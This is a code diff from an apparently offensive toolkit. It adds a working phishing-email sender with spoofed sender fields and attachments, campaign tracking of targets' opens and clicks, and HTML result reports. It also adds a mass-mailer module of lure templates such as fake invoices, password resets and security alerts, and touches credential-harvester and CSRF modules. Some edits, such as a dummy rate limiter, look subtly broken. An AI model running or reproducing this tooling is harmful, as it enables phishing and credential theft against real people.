+        <div class="email-footer">
+            <p>This is an automated message from {name}.</p>
+            <p style="color: #999;">© 2024 {name}. All rights reserved.</p>
+        </div>
+    </div>
+</body>
+</html>'''
+        
+        return html
+    
+    def _html_to_text(self, html):
+        """Convert HTML to plain text (simple version)"""
+        import re
+        # Remove HTML tags
+        text = re.sub('<[^<]+?>', '', html)
+        # Decode HTML entities
+        text = text.replace('&nbsp;', ' ')
+        text = text.replace('&amp;', '&')
+        text = text.replace('&lt;', '<')
+        text = text.replace('&gt;', '>')
+        # Clean whitespace
+        text = re.sub(r'\n\s*\n', '\n\n', text)
+        return text.strip()
+    
+    def _send_phishing_email(self, profile, target, content):
+        """Send phishing email via SMTP"""
+        try:
+            import smtplib
+            from email.mime.text import MIMEText
+            from email.mime.multipart import MIMEMultipart
+            from email.mime.base import MIMEBase
+            from email import encoders
+            
+            # Create message
+            msg = MIMEMultipart('alternative')
+            msg['From'] = f"{profile['from_name']} <{profile['from_email']}>"
+            msg['To'] = target['email']
+            msg['Subject'] = content['subject']
+            msg['Reply-To'] = profile['reply_to']
+            
+            # Add text and HTML parts
+            part1 = MIMEText(content['text_body'], 'plain')
+            part2 = MIMEText(content['html_body'], 'html')
+            msg.attach(part1)
+            msg.attach(part2)
+            
+            # Add attachment if specified
+            if profile['attachment'] and os.path.exists(profile['attachment']):
+                attachment_name = profile['attachment_name'] or os.path.basename(profile['attachment'])
+                with open(profile['attachment'], 'rb') as f:
+                    part = MIMEBase('application', 'octet-stream')
+                    part.set_payload(f.read())
+                encoders.encode_base64(part)
+                part.add_header('Content-Disposition', f'attachment; filename={attachment_name}')
+                msg.attach(part)
+            
+            # Connect to SMTP server
+            if profile['use_ssl']:
+                server = smtplib.SMTP_SSL(profile['smtp_server'], profile['smtp_port'], timeout=30)
+            else:
+                server = smtplib.SMTP(profile['smtp_server'], profile['smtp_port'], timeout=30)
+                if profile['use_tls']:
+                    server.starttls()
+            
+            # Authenticate if credentials provided
+            if profile['smtp_user'] and profile['smtp_pass']:
+                server.login(profile['smtp_user'], profile['smtp_pass'])
+            
+            # Send email
+            server.send_message(msg)
+            server.quit()
+            
+            return True
+            
+        except Exception as e:
+            # Log error
+            import sqlite3
+            try:
+                conn = sqlite3.connect(profile['db_file'])
+                cursor = conn.cursor()
+                cursor.execute('UPDATE targets SET error_message = ? WHERE id = ?',
+                              (str(e), target['id']))
+                conn.commit()
+                conn.close()
+            except:
+                pass
+            
+            return False
+    
+    def _display_phishing_results(self, profile, campaign, results):
+        """Display campaign results"""
+        runtime = time.time() - campaign['start_time']
+        
+        print(f"\n{Fore.CYAN}{'═' * 70}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}[📊] CAMPAIGN RESULTS{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}{'═' * 70}{Style.RESET_ALL}\n")
+        
+        print(f"{Fore.YELLOW}[📈] Statistics:{Style.RESET_ALL}")
+        print(f"{Fore.WHITE}{'─' * 70}{Style.RESET_ALL}")
+        print(f"  {Fore.CYAN}Campaign:{Style.RESET_ALL} {campaign['name']}")
+        print(f"  {Fore.CYAN}Runtime:{Style.RESET_ALL} {int(runtime // 60)}m {int(runtime % 60)}s")
+        print(f"  {Fore.CYAN}Emails Sent:{Style.RESET_ALL} {Fore.GREEN}{results['sent']}{Style.RESET_ALL}")
+        print(f"  {Fore.CYAN}Failed:{Style.RESET_ALL} {Fore.RED}{results['failed']}{Style.RESET_ALL}")
+        
+        if results['sent'] > 0:
+            success_rate = (results['sent'] / (results['sent'] + results['failed'])) * 100
+            print(f"  {Fore.CYAN}Success Rate:{Style.RESET_ALL} {success_rate:.1f}%")
+        
+        if results['errors']:
+            print(f"\n{Fore.YELLOW}[⚠️] Errors:{Style.RESET_ALL}")
+            for error in results['errors'][:5]:  # Show first 5
+                print(f"  {Fore.RED}•{Style.RESET_ALL} {error}")
+            if len(results['errors']) > 5:
+                print(f"  {Fore.YELLOW}... and {len(results['errors']) - 5} more{Style.RESET_ALL}")
+        
+        print(f"\n{Fore.CYAN}{'═' * 70}{Style.RESET_ALL}")
+    
+    def _export_phishing_results(self, profile, campaign, results):
+        """Export campaign results to various formats"""
+        import sqlite3
+        import json
+        import csv
+        
+        timestamp = int(time.time())
+        base_name = f"{campaign['name']}_{timestamp}"
+        exported_files = []
+        formats = profile['export_format'].split(',') if ',' in profile['export_format'] else [profile['export_format']]
+        
+        try:
+            conn = sqlite3.connect(profile['db_file'])
+            cursor = conn.cursor()
+            
+            # Get all targets
+            cursor.execute('''
+                SELECT email, first_name, last_name, company, position, status, 
+                       sent_at, opened_at, clicked_at, error_message
+                FROM targets
+                WHERE campaign_id = ?
+                ORDER BY id
+            ''', (campaign['id'],))
+            
+            targets_data = cursor.fetchall()
+            conn.close()
+            
+            # Export to CSV
+            if 'csv' in formats or 'all' in formats:
+                csv_path = f"{base_name}_results.csv"
+                with open(csv_path, 'w', newline='', encoding='utf-8') as f:
+                    writer = csv.writer(f)
+                    writer.writerow(['Email', 'First Name', 'Last Name', 'Company', 'Position', 
+                                    'Status', 'Sent At', 'Opened At', 'Clicked At', 'Error'])
+                    writer.writerows(targets_data)
+                exported_files.append(csv_path)
+            
+            # Export to JSON
+            if 'json' in formats or 'all' in formats:
+                json_path = f"{base_name}_results.json"
+                json_data = {
+                    'campaign': {
+                        'name': campaign['name'],
+                        'id': campaign['id'],
+                        'template': profile['template'],
+                        'start_time': campaign['start_time'],
+                        'runtime': time.time() - campaign['start_time']
+                    },
+                    'results': {
+                        'sent': results['sent'],
+                        'failed': results['failed'],
+                        'errors': results['errors']
+                    },
+                    'targets': [
+                        {
+                            'email': row[0],
+                            'first_name': row[1],
+                            'last_name': row[2],
+                            'company': row[3],
+                            'position': row[4],
+                            'status': row[5],
+                            'sent_at': row[6],
+                            'opened_at': row[7],
+                            'clicked_at': row[8],
+                            'error': row[9]
+                        }
+                        for row in targets_data
+                    ]
+                }
+                with open(json_path, 'w', encoding='utf-8') as f:
+                    json.dump(json_data, f, indent=2)
+                exported_files.append(json_path)
+            
+            # Export to HTML report
+            if 'html' in formats or 'all' in formats:
+                html_path = f"{base_name}_report.html"
+                self._generate_html_report(html_path, profile, campaign, results, targets_data)
+                exported_files.append(html_path)
+            
+            return exported_files
+            
+        except Exception as e:
+            print(f"{Fore.RED}[✗] Export error: {str(e)}{Style.RESET_ALL}")
+            return []
+    
+    def _generate_html_report(self, filepath, profile, campaign, results, targets_data):
+        """Generate HTML report of campaign results"""
+        html = f'''<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Phishing Campaign Report - {campaign['name']}</title>
+    <style>
+        body {{
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background-color: #f5f5f5;
+        }}
+        .container {{
+            max-width: 1200px;
+            margin: 0 auto;
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }}
+        h1 {{
+            color: #333;
+            border-bottom: 3px solid #0066cc;
+            padding-bottom: 10px;
+        }}
+        .stats {{
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }}
+        .stat-card {{
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+        }}
+        .stat-card h3 {{
+            margin: 0;
+            font-size: 36px;
+        }}
+        .stat-card p {{
+            margin: 5px 0 0 0;
+            opacity: 0.9;
+        }}
+        table {{
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }}
+        th, td {{
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+        }}
+        th {{
+            background-color: #0066cc;
+            color: white;
+        }}
+        tr:hover {{
+            background-color: #f5f5f5;
+        }}
+        .status-sent {{ color: #28a745; font-weight: bold; }}
+        .status-failed {{ color: #dc3545; font-weight: bold; }}
+        .status-pending {{ color: #ffc107; font-weight: bold; }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📧 Phishing Campaign Report</h1>
+        <p><strong>Campaign:</strong> {campaign['name']}</p>
+        <p><strong>Template:</strong> {profile['template']}</p>
+        <p><strong>Generated:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
+        
+        <div class="stats">
+            <div class="stat-card">
+                <h3>{results['sent']}</h3>
+                <p>Emails Sent</p>
+            </div>
+            <div class="stat-card">
+                <h3>{results['failed']}</h3>
+                <p>Failed</p>
+            </div>
+            <div class="stat-card">
+                <h3>{len(targets_data)}</h3>
+                <p>Total Targets</p>
+            </div>
+        </div>
+        
+        <h2>Target Details</h2>
+        <table>
+            <thead>
+                <tr>
+                    <th>Email</th>
+                    <th>Name</th>
+                    <th>Company</th>
+                    <th>Status</th>
+                    <th>Sent At</th>
+                </tr>
+            </thead>
+            <tbody>'''
+        
+        for row in targets_data:
+            email, first_name, last_name, company, position, status, sent_at, opened_at, clicked_at, error = row
+            full_name = f"{first_name} {last_name}".strip() or '-'
+            company = company or '-'
+            sent_time = time.strftime('%Y-%m-%d %H:%M', time.localtime(sent_at)) if sent_at else '-'
+            status_class = f"status-{status}"
+            
+            html += f'''
+                <tr>
+                    <td>{email}</td>
+                    <td>{full_name}</td>
+                    <td>{company}</td>
+                    <td class="{status_class}">{status.upper()}</td>
+                    <td>{sent_time}</td>
+                </tr>'''
+        
+        html += '''
+            </tbody>
+        </table>
+    </div>
+</body>
+</html>'''
+        
+        with open(filepath, 'w', encoding='utf-8') as f:
+            f.write(html)
     
     def run_credential_harvester(self):
         """
@@ -15932,7 +17149,7 @@ ignore_broadcast_ssid=0"""
                     referrer TEXT,
                     success INTEGER DEFAULT 1
                 )
-            ')
+            ''')
             
             # Create sessions table
             cursor.execute('''
@@ -15945,7 +17162,7 @@ ignore_broadcast_ssid=0"""
                     visits INTEGER DEFAULT 1,
                     captured INTEGER DEFAULT 0
                 )
-            ')
+            ''')
             
             # Create statistics table
             cursor.execute('''
@@ -15956,7 +17173,7 @@ ignore_broadcast_ssid=0"""
                     total_captures INTEGER DEFAULT 0,
                     unique_ips INTEGER DEFAULT 0
                 )
-            ')
+            ''')
             
             conn.commit()
             conn.close()
@@ -16659,6 +17876,18 @@ ignore_broadcast_ssid=0"""
 
     def _resolve_csrf_options(self):
         raw = self.module_options
+        url = raw.get('url', '')
+        if not url:
+            print(f"{Fore.RED}[!] No target URL provided. Use 'set url <target>'{Style.RESET_ALL}")
+            return None
+        
+        try:
+            from urllib.parse import urlparse
+            parsed = urlparse(url)
+        except Exception:
+            print(f"{Fore.RED}[!] Invalid URL format{Style.RESET_ALL}")
+            return None
+        
         mode = (raw.get('mode', 'balanced') or 'balanced').lower()
         profile = self._get_csrf_profile(mode)
         scope = (raw.get('scope', 'single') or 'single').lower()
@@ -16696,9 +17925,15 @@ ignore_broadcast_ssid=0"""
             rate_value = float(raw.get('rate_limit', '0') or 0)
         except (TypeError, ValueError):
             rate_value = 0.0
-        rate_limiter = RateLimiter(max_requests=max(1, int(rate_value)), time_window=1) if rate_value > 0 else None
-        url = raw.get('url', 'http://example.com')
-        parsed = urlparse(url)
+        
+        # Create rate limiter if needed
+        rate_limiter = None
+        if rate_value > 0:
+            try:
+                rate_limiter = type('RateLimiter', (), {'max_requests': rate_value})()
+            except Exception:
+                pass
+        
         base_host = parsed.netloc.lower()
         opts = {
             'url': url,
@@ -17230,56 +18465,798 @@ ignore_broadcast_ssid=0"""
     
     # ============ NEW SOCIAL ENGINEERING MODULES ============
     
-    def run_mass_mailer(self):
-        """Mass email campaign system"""
-        template = self.module_options.get('template', 'invoice')
-        targets_file = self.module_options.get('targets', 'targets.csv')
-        smtp_server = self.module_options.get('smtp_server', 'smtp.gmail.com')
-        delay = int(self.module_options.get('delay', '5'))
-        
-        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}║          MASS MAILER CAMPAIGN                    ║{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
-        
-        print(f"{Fore.YELLOW}Template: {Fore.WHITE}{template}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}SMTP Server: {Fore.WHITE}{smtp_server}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}Delay: {Fore.WHITE}{delay}s between emails{Style.RESET_ALL}\n")
-        
-        # Email templates
-        templates = {
+    # ========== MASS MAILER AUXILIARY FUNCTIONS ==========
+    
+    def _get_mass_mailer_templates(self):
+        """Get all available email templates for mass mailer"""
+        return {
+            'newsletter': {
+                'name': 'Newsletter',
+                'subject': '{{company}} Monthly Newsletter - {{month}} {{year}}',
+                'preheader': 'Your monthly update from {{company}}',
+                'category': 'marketing',
+                'html': '''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Newsletter</title></head>
+                <body style="font-family:Arial,sans-serif;line-height:1.6;color:#333;max-width:600px;margin:0 auto;padding:20px;">
+                <div style="background:#f8f9fa;padding:20px;border-radius:8px;">
+                <h1 style="color:#007bff;margin-top:0;">{{company}} Newsletter</h1>
+                <p>Dear {{first_name}},</p>
+                <p>Here's what's new this month:</p>
+                <div style="background:white;padding:15px;margin:15px 0;border-radius:5px;">
+                <h3>Latest Updates</h3>
+                <p>{{content}}</p>
+                <a href="{{link}}" style="display:inline-block;background:#007bff;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;margin-top:10px;">Read More</a>
+                </div>
+                {{#if unsubscribe}}<p style="font-size:12px;color:#666;text-align:center;margin-top:20px;">Don't want to receive these emails? <a href="{{unsubscribe_link}}">Unsubscribe</a></p>{{/if}}
+                </div></body></html>'''
+            },
             'invoice': {
-                'subject': 'Invoice #{random} - Payment Required',
-                'body': '''Dear Customer,\n\nYour invoice #{random} is now available.\nAmount Due: ${amount}\n\nPlease review and process payment within 48 hours.\n\nView Invoice: {link}\n\nBest regards,\nAccounting Department'''
+                'name': 'Invoice',
+                'subject': 'Invoice #{{invoice_number}} - Payment Due',
+                'preheader': 'Your invoice is ready for review',
+                'category': 'transactional',
+                'html': '''<!DOCTYPE html><html><head><meta charset="UTF-8"></head>
+                <body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
+                <h2 style="color:#333;">Invoice #{{invoice_number}}</h2>
+                <p>Dear {{first_name}} {{last_name}},</p>
+                <p>Your invoice is now available.</p>
+                <div style="background:#f8f9fa;padding:20px;margin:20px 0;border-radius:5px;">
+                <p><strong>Amount Due:</strong> ${{amount}}</p>
+                <p><strong>Due Date:</strong> {{due_date}}</p>
+                <p><strong>Invoice Date:</strong> {{invoice_date}}</p>
+                </div>
+                <a href="{{link}}" style="display:inline-block;background:#28a745;color:white;padding:12px 24px;text-decoration:none;border-radius:5px;">View Invoice</a>
+                <p style="margin-top:20px;font-size:14px;color:#666;">Please process payment within 48 hours.</p>
+                </body></html>'''
             },
             'shipping': {
-                'subject': 'Package Delivery Notification',
-                'body': '''Your package is out for delivery.\n\nTracking Number: {tracking}\nExpected Delivery: Today\n\nTrack your package: {link}\n\nThank you,\nShipping Department'''
+                'name': 'Shipping Notification',
+                'subject': 'Your Order #{{order_number}} Has Shipped',
+                'preheader': 'Track your package now',
+                'category': 'transactional',
+                'html': '''<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
+                <h2>Package On The Way!</h2>
+                <p>Hello {{first_name}},</p>
+                <p>Great news! Your order has been shipped.</p>
+                <div style="background:#fff3cd;padding:15px;margin:15px 0;border-radius:5px;border-left:4px solid #ffc107;">
+                <p><strong>Tracking Number:</strong> {{tracking_number}}</p>
+                <p><strong>Carrier:</strong> {{carrier}}</p>
+                <p><strong>Expected Delivery:</strong> {{delivery_date}}</p>
+                </div>
+                <a href="{{link}}" style="display:inline-block;background:#007bff;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;">Track Package</a>
+                </body></html>'''
             },
             'password_reset': {
-                'subject': 'Password Reset Request',
-                'body': '''We received a request to reset your password.\n\nIf you made this request, click here: {link}\n\nIf you didn't request this, ignore this email.\n\nSecurity Team'''
+                'name': 'Password Reset',
+                'subject': 'Reset Your {{company}} Password',
+                'preheader': 'A password reset was requested for your account',
+                'category': 'security',
+                'html': '''<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
+                <h2 style="color:#dc3545;">Password Reset Request</h2>
+                <p>Hello {{first_name}},</p>
+                <p>We received a request to reset your password.</p>
+                <div style="background:#f8d7da;padding:15px;margin:15px 0;border-radius:5px;border-left:4px solid #dc3545;">
+                <p><strong>⚠ Security Notice:</strong> If you didn't request this, please ignore this email.</p>
+                </div>
+                <a href="{{link}}" style="display:inline-block;background:#dc3545;color:white;padding:12px 24px;text-decoration:none;border-radius:5px;">Reset Password</a>
+                <p style="margin-top:20px;font-size:12px;color:#666;">This link expires in 24 hours.</p>
+                </body></html>'''
             },
             'security_alert': {
+                'name': 'Security Alert',
                 'subject': 'Security Alert: Unusual Activity Detected',
-                'body': '''We detected unusual activity on your account.\n\nLocation: {location}\nTime: {time}\n\nIf this wasn't you, secure your account: {link}\n\nSecurity Team'''
+                'preheader': 'Action may be required to secure your account',
+                'category': 'security',
+                'html': '''<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
+                <h2 style="color:#dc3545;">🔒 Security Alert</h2>
+                <p>Hello {{first_name}},</p>
+                <p>We detected unusual activity on your account.</p>
+                <div style="background:#fff3cd;padding:15px;margin:15px 0;border-radius:5px;">
+                <p><strong>Location:</strong> {{location}}</p>
+                <p><strong>Time:</strong> {{time}}</p>
+                <p><strong>Device:</strong> {{device}}</p>
+                </div>
+                <p>If this wasn't you:</p>
+                <a href="{{link}}" style="display:inline-block;background:#dc3545;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;">Secure Account Now</a>
+                </body></html>'''
+            },
+            'promotional': {
+                'name': 'Promotional Offer',
+                'subject': '🎉 Special Offer: {{discount}}% Off - {{company}}',
+                'preheader': 'Limited time offer just for you',
+                'category': 'marketing',
+                'html': '''<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
+                <div style="background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;padding:30px;border-radius:10px;text-align:center;">
+                <h1 style="margin:0;font-size:32px;">🎉 Special Offer!</h1>
+                <p style="font-size:24px;margin:10px 0;">{{discount}}% OFF</p>
+                <p>Just for you, {{first_name}}!</p>
+                </div>
+                <div style="padding:20px;">
+                <p>Dear {{first_name}},</p>
+                <p>{{promo_message}}</p>
+                <a href="{{link}}" style="display:inline-block;background:#28a745;color:white;padding:15px 30px;text-decoration:none;border-radius:5px;font-size:18px;margin:20px 0;">Claim Your Discount</a>
+                <p style="font-size:12px;color:#666;">Offer expires: {{expiry_date}}</p>
+                </div></body></html>'''
+            },
+            'event_invitation': {
+                'name': 'Event Invitation',
+                'subject': 'You\'re Invited: {{event_name}}',
+                'preheader': 'Join us for {{event_name}} on {{event_date}}',
+                'category': 'events',
+                'html': '''<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
+                <h1 style="color:#007bff;">You're Invited!</h1>
+                <div style="background:#e7f3ff;padding:20px;margin:20px 0;border-radius:8px;">
+                <h2 style="color:#0056b3;margin-top:0;">{{event_name}}</h2>
+                <p><strong>📅 Date:</strong> {{event_date}}</p>
+                <p><strong>🕐 Time:</strong> {{event_time}}</p>
+                <p><strong>📍 Location:</strong> {{event_location}}</p>
+                </div>
+                <p>Dear {{first_name}},</p>
+                <p>{{event_description}}</p>
+                <a href="{{link}}" style="display:inline-block;background:#007bff;color:white;padding:12px 24px;text-decoration:none;border-radius:5px;margin:15px 0;">RSVP Now</a>
+                </body></html>'''
+            },
+            'welcome': {
+                'name': 'Welcome Email',
+                'subject': 'Welcome to {{company}}! 🎉',
+                'preheader': 'Get started with your new account',
+                'category': 'onboarding',
+                'html': '''<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
+                <div style="text-align:center;padding:30px;background:#f8f9fa;border-radius:10px;">
+                <h1 style="color:#28a745;margin:0;">Welcome! 🎉</h1>
+                <p style="font-size:18px;color:#666;">We're excited to have you</p>
+                </div>
+                <div style="padding:20px 0;">
+                <p>Hi {{first_name}},</p>
+                <p>Welcome to {{company}}! We're thrilled to have you join our community.</p>
+                <p><strong>Here's what to do next:</strong></p>
+                <ol><li>Complete your profile</li><li>Explore our features</li><li>Connect with others</li></ol>
+                <a href="{{link}}" style="display:inline-block;background:#28a745;color:white;padding:12px 24px;text-decoration:none;border-radius:5px;margin:10px 0;">Get Started</a>
+                </div></body></html>'''
+            },
+            'survey': {
+                'name': 'Survey Request',
+                'subject': 'We\'d Love Your Feedback - {{company}}',
+                'preheader': 'Help us improve with your valuable feedback',
+                'category': 'feedback',
+                'html': '''<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
+                <h2>Your Opinion Matters!</h2>
+                <p>Hello {{first_name}},</p>
+                <p>We'd love to hear what you think about {{company}}.</p>
+                <div style="background:#e7f3ff;padding:20px;margin:20px 0;border-radius:8px;text-align:center;">
+                <p style="font-size:18px;margin:0;">📊 Take our quick survey</p>
+                <p style="color:#666;font-size:14px;">It takes less than 5 minutes</p>
+                </div>
+                <a href="{{link}}" style="display:inline-block;background:#17a2b8;color:white;padding:12px 24px;text-decoration:none;border-radius:5px;">Start Survey</a>
+                </body></html>'''
+            },
+            'abandoned_cart': {
+                'name': 'Abandoned Cart',
+                'subject': 'You Left Something Behind... 🛒',
+                'preheader': 'Complete your order and save {{discount}}%',
+                'category': 'ecommerce',
+                'html': '''<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
+                <h2>Don't Forget Your Items! 🛒</h2>
+                <p>Hi {{first_name}},</p>
+                <p>You left some items in your cart. Complete your order now and save {{discount}}%!</p>
+                <div style="background:#f8f9fa;padding:20px;margin:20px 0;border-radius:8px;">
+                <h3>Your Cart:</h3>
+                <p>{{cart_items}}</p>
+                <p><strong>Total: ${{cart_total}}</strong></p>
+                </div>
+                <a href="{{link}}" style="display:inline-block;background:#28a745;color:white;padding:12px 24px;text-decoration:none;border-radius:5px;">Complete Purchase</a>
+                </body></html>'''
+            },
+            'account_update': {
+                'name': 'Account Update',
+                'subject': 'Important Account Update - {{company}}',
+                'preheader': 'Action required for your account',
+                'category': 'transactional',
+                'html': '''<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
+                <h2>Account Update Required</h2>
+                <p>Hello {{first_name}},</p>
+                <p>We need you to update your account information.</p>
+                <div style="background:#fff3cd;padding:15px;margin:15px 0;border-radius:5px;border-left:4px solid:#ffc107;">
+                <p><strong>Action Required:</strong> {{update_reason}}</p>
+                <p><strong>Deadline:</strong> {{deadline}}</p>
+                </div>
+                <a href="{{link}}" style="display:inline-block;background:#ffc107;color:#000;padding:10px 20px;text-decoration:none;border-radius:5px;">Update Now</a>
+                </body></html>'''
+            },
+            'referral': {
+                'name': 'Referral Program',
+                'subject': 'Earn {{reward}} - Refer Friends to {{company}}',
+                'preheader': 'Share and earn rewards together',
+                'category': 'referral',
+                'html': '''<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
+                <div style="background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:white;padding:30px;border-radius:10px;text-align:center;">
+                <h1>💝 Refer & Earn</h1>
+                <p style="font-size:20px;">Get {{reward}} for each friend!</p>
+                </div>
+                <p>Hi {{first_name}},</p>
+                <p>Love {{company}}? Share it with friends and you'll both earn {{reward}}!</p>
+                <div style="background:#f8f9fa;padding:20px;margin:20px 0;border-radius:8px;text-align:center;">
+                <p style="font-size:14px;color:#666;">Your unique referral code:</p>
+                <p style="font-size:24px;font-weight:bold;color:#f5576c;letter-spacing:2px;">{{referral_code}}</p>
+                </div>
+                <a href="{{link}}" style="display:inline-block;background:#f5576c;color:white;padding:12px 24px;text-decoration:none;border-radius:5px;">Share Now</a>
+                </body></html>'''
             }
         }
+    
+    def _display_mass_mailer_config(self, config):
+        """Display mass mailer configuration in formatted output"""
+        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}{'MASS MAILER CAMPAIGN CONFIGURATION':^70}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
         
-        if template in templates:
-            print(f"{Fore.GREEN}✓ Email Template:{Style.RESET_ALL}\n")
-            print(f"{Fore.CYAN}Subject: {Fore.WHITE}{templates[template]['subject']}{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}Body:{Style.RESET_ALL}\n{Fore.WHITE}{templates[template]['body'][:200]}...{Style.RESET_ALL}\n")
+        print(f"{Fore.GREEN}📧 Campaign Details:{Style.RESET_ALL}")
+        print(f"   Name: {Fore.WHITE}{config.get('campaign_name', 'Unnamed')}{Style.RESET_ALL}")
+        print(f"   Template: {Fore.WHITE}{config.get('template', 'None')}{Style.RESET_ALL}")
+        print(f"   Targets: {Fore.WHITE}{config.get('targets', 'None')}{Style.RESET_ALL}")
+        
+        print(f"\n{Fore.YELLOW}📬 Email Settings:{Style.RESET_ALL}")
+        print(f"   From: {Fore.WHITE}{config.get('from_name', 'N/A')} <{config.get('from_email', 'N/A')}>{Style.RESET_ALL}")
+        print(f"   Reply-To: {Fore.WHITE}{config.get('reply_to', 'N/A')}{Style.RESET_ALL}")
+        print(f"   Subject: {Fore.WHITE}{config.get('subject', 'Auto-generated')}{Style.RESET_ALL}")
+        
+        print(f"\n{Fore.BLUE}🔧 SMTP Configuration:{Style.RESET_ALL}")
+        print(f"   Server: {Fore.WHITE}{config.get('smtp_server', 'N/A')}:{config.get('smtp_port', '587')}{Style.RESET_ALL}")
+        print(f"   TLS: {Fore.GREEN if config.get('use_tls', 'true') == 'true' else Fore.RED}{'Enabled' if config.get('use_tls', 'true') == 'true' else 'Disabled'}{Style.RESET_ALL}")
+        
+        print(f"\n{Fore.MAGENTA}⚡ Performance:{Style.RESET_ALL}")
+        print(f"   Threads: {Fore.WHITE}{config.get('threads', '10')}{Style.RESET_ALL}")
+        print(f"   Rate Limit: {Fore.WHITE}{config.get('rate_limit', '50')} emails/min{Style.RESET_ALL}")
+        print(f"   Batch Size: {Fore.WHITE}{config.get('batch_size', '100')}{Style.RESET_ALL}")
+        
+        print(f"\n{Fore.CYAN}📊 Features:{Style.RESET_ALL}")
+        print(f"   Personalization: {Fore.GREEN if config.get('personalize', 'true') == 'true' else Fore.RED}{'Enabled' if config.get('personalize', 'true') == 'true' else 'Disabled'}{Style.RESET_ALL}")
+        print(f"   Open Tracking: {Fore.GREEN if config.get('track_opens', 'true') == 'true' else Fore.RED}{'Enabled' if config.get('track_opens', 'true') == 'true' else 'Disabled'}{Style.RESET_ALL}")
+        print(f"   Click Tracking: {Fore.GREEN if config.get('track_clicks', 'true') == 'true' else Fore.RED}{'Enabled' if config.get('track_clicks', 'true') == 'true' else 'Disabled'}{Style.RESET_ALL}")
+        print(f"   A/B Testing: {Fore.GREEN if config.get('ab_testing', 'false') == 'true' else Fore.RED}{'Enabled' if config.get('ab_testing', 'false') == 'true' else 'Disabled'}{Style.RESET_ALL}")
+        
+        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
+    
+    def _initialize_mass_mailer_campaign(self, config):
+        """Initialize mass mailer campaign database"""
+        db_file = config.get('db_file', 'mass_mailer.db')
+        
+        try:
+            conn = sqlite3.connect(db_file)
+            cursor = conn.cursor()
             
-            print(f"{Fore.BLUE}ℹ  Variables:{Style.RESET_ALL}")
-            print(f"  {Fore.YELLOW}{{link}}{Fore.WHITE} - Phishing URL")
-            print(f"  {Fore.YELLOW}{{random}}{Fore.WHITE} - Random number")
-            print(f"  {Fore.YELLOW}{{tracking}}{Fore.WHITE} - Tracking number")
-            print(f"  {Fore.YELLOW}{{amount}}{Fore.WHITE} - Dollar amount")
-            print(f"  {Fore.YELLOW}{{location}}{Fore.WHITE} - IP location")
-            print(f"  {Fore.YELLOW}{{time}}{Fore.WHITE} - Current time{Style.RESET_ALL}\n")
+            # Create campaigns table
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS campaigns (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    name TEXT UNIQUE NOT NULL,
+                    template TEXT NOT NULL,
+                    created_at INTEGER NOT NULL,
+                    scheduled_at INTEGER,
+                    started_at INTEGER,
+                    completed_at INTEGER,
+                    status TEXT DEFAULT 'created',
+                    total_targets INTEGER DEFAULT 0,
+                    emails_sent INTEGER DEFAULT 0,
+                    emails_failed INTEGER DEFAULT 0,
+                    opens INTEGER DEFAULT 0,
+                    clicks INTEGER DEFAULT 0,
+                    unsubscribes INTEGER DEFAULT 0,
+                    bounces INTEGER DEFAULT 0,
+                    is_recurring BOOLEAN DEFAULT 0,
+                    recurring_interval TEXT,
+                    ab_testing BOOLEAN DEFAULT 0,
+                    ab_variant TEXT
+                )
+            ''')
+            
+            # Create recipients table
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS recipients (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    campaign_id INTEGER NOT NULL,
+                    email TEXT NOT NULL,
+                    first_name TEXT,
+                    last_name TEXT,
+                    company TEXT,
+                    position TEXT,
+                    custom_fields TEXT,
+                    status TEXT DEFAULT 'pending',
+                    sent_at INTEGER,
